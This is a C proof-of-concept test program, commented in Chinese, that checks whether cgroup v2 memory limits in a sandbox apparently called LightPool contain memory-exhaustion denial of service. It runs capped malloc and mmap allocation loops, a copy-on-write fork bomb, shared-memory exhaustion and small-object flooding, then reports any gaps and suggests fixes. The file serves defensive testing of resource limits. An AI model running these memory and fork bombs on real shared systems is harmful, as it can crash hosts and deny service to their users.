/*
 * POC-010: 内存耗尽 OOM 拒绝服务
 *
 * 攻击技术：通过多种方式耗尽系统内存，触发 OOM Killer 或导致系统不稳定
 * - 经典 malloc 循环分配
 * - mmap 匿名映射（不占用物理内存直到 touch）
 * - 写时复制（COW）fork 炸弹（每个子进程写时复制父进程内存）
 * - 共享内存耗尽（/dev/shm）
 * - 内存碎片化（大量小对象分配）
 * - HugeTLB 内存耗尽
 *
 * 预期行为：
 * - cgroup memory.max 限制生效
 * - OOM Killer 在 cgroup 内终止进程，不影响宿主机
 * - memory.swap.max 限制交换使用
 * - 进程被终止，审计日志记录 OOM 事件
 *
 * 风险等级：High
 * 攻击面：LightPool cgroup v2 内存限制
 * 参考：CWE-400 (Uncontrolled Resource Consumption)
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <errno.h>
#include <signal.h>

#define ALLOC_SIZE (10 * 1024 * 1024)  /* 每次分配 10MB */
#define MAX_ALLOCS 1000                  /* 最大分配次数（防止测试机崩溃） */

static int test_results[5] = {0};

/* 测试 1: 经典 malloc 循环分配 */
static void test_malloc_bomb(void) {
    printf("--- 测试 1: malloc 循环分配 ---\n");
    void *ptrs[MAX_ALLOCS];
    int count = 0;
    int oom_triggered = 0;

    for (int i = 0; i < MAX_ALLOCS; i++) {
        ptrs[i] = malloc(ALLOC_SIZE);
        if (ptrs[i] == NULL) {
            printf("[*] malloc 失败 at %d: %s\n", i, strerror(errno));
            oom_triggered = 1;
            break;
        }
        /* touch 内存，确保物理内存分配 */
        memset(ptrs[i], 0xAA, ALLOC_SIZE);
        count++;

        if (count % 50 == 0) {
            printf("[*] 已分配 %d MB\n", count * 10);
        }
    }

    /* 检查 cgroup 内存限制是否生效 */
    if (oom_triggered || count < MAX_ALLOCS) {
        printf("[+] 内存限制生效（分配在 %d MB 时被阻止或 OOM）\n", count * 10);
    } else {
        printf("[!] 成功分配 %d MB 内存（可能缺少 cgroup 内存限制）\n", count * 10);
        test_results[0] = 1;
    }

    /* 清理 */
    for (int i = 0; i < count; i++) {
        free(ptrs[i]);
    }
}

/* 测试 2: mmap 匿名映射 + touch */
static void test_mmap_bomb(void) {
    printf("\n--- 测试 2: mmap 匿名映射 ---\n");
    void *ptrs[MAX_ALLOCS];
    int count = 0;

    for (int i = 0; i < MAX_ALLOCS; i++) {
        ptrs[i] = mmap(NULL, ALLOC_SIZE, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (ptrs[i] == MAP_FAILED) {
            printf("[*] mmap 失败 at %d: %s\n", i, strerror(errno));
            break;
        }
        /* touch 内存 */
        memset(ptrs[i], 0xBB, ALLOC_SIZE);
        count++;

        if (count % 50 == 0) {
            printf("[*] mmap 已分配 %d MB\n", count * 10);
        }
    }

    if (count < MAX_ALLOCS) {
        printf("[+] mmap 内存限制生效（%d MB）\n", count * 10);
    } else {
        printf("[!] mmap 成功分配 %d MB（可能缺少内存限制）\n", count * 10);
        test_results[1] = 1;
    }

    for (int i = 0; i < count; i++) {
        munmap(ptrs[i], ALLOC_SIZE);
    }
}

/* 测试 3: COW fork 炸弹（写时复制） */
static void test_cow_fork_bomb(void) {
    printf("\n--- 测试 3: COW fork 炸弹 ---\n");
    /* 先分配一大块内存 */
    size_t big_size = 100 * 1024 * 1024;  /* 100MB */
    void *big_buf = malloc(big_size);
    if (big_buf == NULL) {
        printf("[-] 无法分配大内存: %s\n", strerror(errno));
        return;
    }
    memset(big_buf, 0xCC, big_size);

    int child_count = 0;
    int max_children = 20;  /* 限制子进程数量 */

    for (int i = 0; i < max_children; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            /* 子进程：写时复制父进程内存 */
            memset(big_buf, 0xDD, big_size);  /* 触发 COW */
            usleep(100000);  /* 保持运行 100ms */
            _exit(0);
        } else if (pid > 0) {
            child_count++;
        } else {
            printf("[*] fork 失败 at %d: %s\n", i, strerror(errno));
            break;
        }
    }

    /* 等待所有子进程 */
    for (int i = 0; i < child_count; i++) {
        int status;
        wait(&status);
    }

    printf("[*] 创建了 %d 个子进程，每个触发 100MB COW\n", child_count);
    if (child_count < max_children) {
        printf("[+] fork/pid 限制生效（%d 个子进程）\n", child_count);
    } else {
        printf("[!] 成功创建 %d 个子进程（可能缺少 pid 限制）\n", child_count);
        test_results[2] = 1;
    }

    free(big_buf);
}

/* 测试 4: 共享内存耗尽 */
static void test_shm_bomb(void) {
    printf("\n--- 测试 4: 共享内存耗尽 ---\n");
    int shm_ids[MAX_ALLOCS];
    int count = 0;

    for (int i = 0; i < 100; i++) {  /* 限制 100 次，每次 10MB = 1GB */
        key_t key = IPC_PRIVATE;
        int shmid = shmget(key, ALLOC_SIZE, IPC_CREAT | 0666);
        if (shmid < 0) {
            printf("[*] shmget 失败 at %d: %s\n", i, strerror(errno));
            break;
        }
        void *addr = shmat(shmid, NULL, 0);
        if (addr == (void *)-1) {
            printf("[*] shmat 失败 at %d: %s\n", i, strerror(errno));
            shmctl(shmid, IPC_RMID, NULL);
            break;
        }
        memset(addr, 0xEE, ALLOC_SIZE);
        shm_ids[count] = shmid;
        count++;
    }

    if (count < 100) {
        printf("[+] 共享内存限制生效（%d MB）\n", count * 10);
    } else {
        printf("[!] 成功分配 %d MB 共享内存（可能缺少 IPC 限制）\n", count * 10);
        test_results[3] = 1;
    }

    /* 清理 */
    for (int i = 0; i < count; i++) {
        shmctl(shm_ids[i], IPC_RMID, NULL);
    }
}

/* 测试 5: 内存碎片化（大量小对象） */
static void test_memory_fragmentation(void) {
    printf("\n--- 测试 5: 内存碎片化 ---\n");
    #define SMALL_SIZE 4096  /* 4KB */
    #define SMALL_COUNT 100000  /* 10万个 4KB = 400MB */

    void *small_ptrs[SMALL_COUNT];
    int count = 0;

    for (int i = 0; i < SMALL_COUNT; i++) {
        small_ptrs[i] = malloc(SMALL_SIZE);
        if (small_ptrs[i] == NULL) {
            printf("[*] 小对象分配失败 at %d: %s\n", i, strerror(errno));
            break;
        }
        memset(small_ptrs[i], 0xFF, SMALL_SIZE);
        count++;
    }

    printf("[*] 分配了 %d 个 4KB 小对象（共 %d MB）\n", count, count * 4 / 1024);
    if (count < SMALL_COUNT) {
        printf("[+] 内存限制生效（碎片化分配被阻止）\n");
    } else {
        printf("[!] 成功分配 %d 个小对象（可能缺少内存限制）\n", count);
        test_results[4] = 1;
    }

    for (int i = 0; i < count; i++) {
        free(small_ptrs[i]);
    }
}

int main(void) {
    int dos_found = 0;

    printf("[*] POC-010: 内存耗尽 OOM 拒绝服务测试\n");
    printf("[*] 目标：验证 cgroup v2 内存限制和 OOM Killer\n\n");

    test_malloc_bomb();
    test_mmap_bomb();
    test_cow_fork_bomb();
    test_shm_bomb();
    test_memory_fragmentation();

    for (int i = 0; i < 5; i++) {
        dos_found |= test_results[i];
    }

    printf("\n");
    if (dos_found) {
        printf("[!] 结果：发现内存耗尽 DoS 漏洞！\n");
        printf("[!] 修复建议：配置 cgroup memory.max + memory.swap.max + pids.max\n");
        return 2;
    } else {
        printf("[+] 结果：所有内存耗尽测试均被 cgroup 限制阻止\n");
        return 0;
    }
}
